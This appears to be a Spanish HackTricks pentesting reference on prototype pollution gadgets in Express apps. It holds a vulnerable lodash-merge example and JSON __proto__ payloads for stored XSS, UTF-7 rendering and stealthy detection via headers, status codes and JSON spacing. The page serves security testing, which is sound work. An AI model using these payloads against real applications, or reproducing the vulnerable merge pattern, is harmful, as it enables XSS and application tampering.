# Gadgets de Prototype Pollution de Express

<details>

<summary><a href="https://cloud.hacktricks.xyz/pentesting-cloud/pentesting-cloud-methodology"><strong>â˜ï¸ HackTricks Cloud â˜ï¸</strong></a> -<a href="https://twitter.com/hacktricks_live"><strong>ğŸ¦ Twitter ğŸ¦</strong></a> - <a href="https://www.twitch.tv/hacktricks_live/schedule"><strong>ğŸ™ï¸ Twitch ğŸ™ï¸</strong></a> - <a href="https://www.youtube.com/@hacktricks_LIVE"><strong>ğŸ¥ Youtube ğŸ¥</strong></a></summary>

* Â¿Trabajas en una **empresa de ciberseguridad**? Â¿Quieres ver tu **empresa anunciada en HackTricks**? Â¿O quieres tener acceso a la **Ãºltima versiÃ³n de PEASS o descargar HackTricks en PDF**? Â¡Consulta los [**PLANES DE SUSCRIPCIÃ“N**](https://github.com/sponsors/carlospolop)!
* Descubre [**The PEASS Family**](https://opensea.io/collection/the-peass-family), nuestra colecciÃ³n exclusiva de [**NFTs**](https://opensea.io/collection/the-peass-family)
* ObtÃ©n el [**swag oficial de PEASS y HackTricks**](https://peass.creator-spring.com)
* **Ãšnete al** [**ğŸ’¬**](https://emojipedia.org/speech-balloon/) [**grupo de Discord**](https://discord.gg/hRep4RUj7f) o al [**grupo de telegram**](https://t.me/peass) o **sÃ­gueme** en **Twitter** [**ğŸ¦**](https://github.com/carlospolop/hacktricks/tree/7af18b62b3bdc423e11444677a6a73d4043511e9/\[https:/emojipedia.org/bird/README.md)[**@carlospolopm**](https://twitter.com/hacktricks_live)**.**
* **Comparte tus trucos de hacking enviando PRs al** [**repositorio de hacktricks**](https://github.com/carlospolop/hacktricks) **y al** [**repositorio de hacktricks-cloud**](https://github.com/carlospolop/hacktricks-cloud).

</details>

## Servir respuestas XSS

### Cambiar el tipo de contenido JSON a HTML

En una aplicaciÃ³n Express que utiliza una **respuesta de tipo de contenido JSON** y refleja un JSON:
```javascript
app.use(bodyParser.json({type: 'application/json'}));
app.post('/', function(req, res){
    _.merge({}, req.body);
   res.send(req.body);
});
```
En estos casos, normalmente no es posible realizar XSS con un tipo de contenido JSON. Sin embargo, con la contaminaciÃ³n del prototipo, podemos **confundir a Express para que sirva una respuesta HTML**. Esta vulnerabilidad depende de que la aplicaciÃ³n use **`res.send(obj)`** y utilice el analizador de cuerpo con el tipo de contenido application/json.
```json
{"__proto__":{"_body":true,"body":"<script>evil()"}}
```
Al **contaminar** tanto las propiedades **`body`** como **`_body`**, es posible hacer que **Express sirva el tipo de contenido HTML** y refleje la propiedad `_body`, lo que resulta en XSS almacenado.

### Renderizar UTF7

Es posible hacer que express **renderice contenido UTF-7 con**:
```json
{"__proto__":{"content-type": "application/json; charset=utf-7"}}
```
## TÃ©cnicas de Escaneo Seguras

### Espacios en JSON

El siguiente PP harÃ¡ que los atributos dentro de un JSON tengan un espacio extra que no romperÃ¡ la funcionalidad:
```json
{"__proto__":{"json spaces": " "}}
```
Entonces, un JSON reflejado se verÃ¡ asÃ­:
```json
{"foo":  "bar"} -- Note the extra space
```
### Cabeceras expuestas

El siguiente gadget de PP harÃ¡ que el servidor envÃ­e de vuelta la cabecera HTTP: **`Access-Control-Expose_headers: foo`**
```json
{"__proto__":{"exposedHeaders":["foo"]}}
```
Se requiere que el mÃ³dulo **CORS estÃ© instalado**

### **MÃ©todo OPTIONS**

Con la siguiente carga Ãºtil, es posible **ocultar un mÃ©todo de una respuesta OPTIONS**:
```javascript
// Original reponse: POST,GET,HEAD

// Payload:
{"__proto__":{"head":true}}

//New response: POST;GET
```
### **Estado**

Es posible cambiar el **cÃ³digo de estado devuelto** utilizando el siguiente payload de PP:
```json
{"__proto__":{"status":510}}
```
### Error

Cuando asignas un prototipo con un primitivo como un string, se produce una **operaciÃ³n no vÃ¡lida ya que el prototipo tiene que ser un objeto**. Si intentas asignar un objeto prototipo al `Object.prototype` en sÃ­ mismo, esto **lanzarÃ¡ una excepciÃ³n**. Podemos usar estos dos comportamientos para **detectar si la contaminaciÃ³n del prototipo fue exitosa**:
```javascript
({}).__proto__.__proto__={}//throws type exception
({}).__proto__.__proto__="x"//no-op does not throw exception
```
### Valor Reflejado

Si la aplicaciÃ³n estÃ¡ reflejando un objeto en la respuesta, simplemente puedes crear un atributo con un **nombre extraÃ±o y el `__proto__`** y si **sÃ³lo el extraÃ±o es reflejado**, es posible que la web sea vulnerable:
```json
{"hacktricks":"rocks","__proto__":"test"}
```
O si se utiliza Lodash o una biblioteca similar, se puede **establecer una propiedad a travÃ©s de PP y dentro del objeto** y si esa propiedad no se refleja es porque Lodash mira el objeto actual para ver si la propiedad ya existe en el objeto fusionado:
```javascript
{"__proto__":{"a":"asd"},"a":"asd2","b":"dfg"}
// If only b is reflected then PP in Lodash
```
## MiscelÃ¡nea

### Permitir puntos

Hay una opciÃ³n en Express que te permite **crear objetos a partir de los parÃ¡metros de la cadena de consulta**.\
Definitivamente podrÃ­as usarlo en una **cadena** de errores para explotar una vulnerabilidad de **poluciÃ³n de prototipos**.
```json
{"__proto__":{"allowDots":true}}
```
## Referencias

* [https://portswigger.net/research/server-side-prototype-pollution](https://portswigger.net/research/server-side-prototype-pollution)

<details>

<summary><a href="https://cloud.hacktricks.xyz/pentesting-cloud/pentesting-cloud-methodology"><strong>â˜ï¸ HackTricks Cloud â˜ï¸</strong></a> -<a href="https://twitter.com/hacktricks_live"><strong>ğŸ¦ Twitter ğŸ¦</strong></a> - <a href="https://www.twitch.tv/hacktricks_live/schedule"><strong>ğŸ™ï¸ Twitch ğŸ™ï¸</strong></a> - <a href="https://www.youtube.com/@hacktricks_LIVE"><strong>ğŸ¥ Youtube ğŸ¥</strong></a></summary>

* Â¿Trabajas en una **empresa de ciberseguridad**? Â¿Quieres ver tu **empresa anunciada en HackTricks**? Â¿O quieres tener acceso a la **Ãºltima versiÃ³n de PEASS o descargar HackTricks en PDF**? Â¡Consulta los [**PLANES DE SUSCRIPCIÃ“N**](https://github.com/sponsors/carlospolop)!
* Descubre [**The PEASS Family**](https://opensea.io/collection/the-peass-family), nuestra colecciÃ³n exclusiva de [**NFTs**](https://opensea.io/collection/the-peass-family)
* ObtÃ©n el [**swag oficial de PEASS y HackTricks**](https://peass.creator-spring.com)
* **Ãšnete al** [**ğŸ’¬**](https://emojipedia.org/speech-balloon/) [**grupo de Discord**](https://discord.gg/hRep4RUj7f) o al [**grupo de telegram**](https://t.me/peass) o **sÃ­gueme** en **Twitter** [**ğŸ¦**](https://github.com/carlospolop/hacktricks/tree/7af18b62b3bdc423e11444677a6a73d4043511e9/\[https:/emojipedia.org/bird/README.md)[**@carlospolopm**](https://twitter.com/hacktricks_live)**.**
* **Comparte tus trucos de hacking enviando PR al** [**repositorio de hacktricks**](https://github.com/carlospolop/hacktricks) **y al** [**repositorio de hacktricks-cloud**](https://github.com/carlospolop/hacktricks-cloud).

</details>

**`?foo.bar=baz` crea un objeto en Node.**
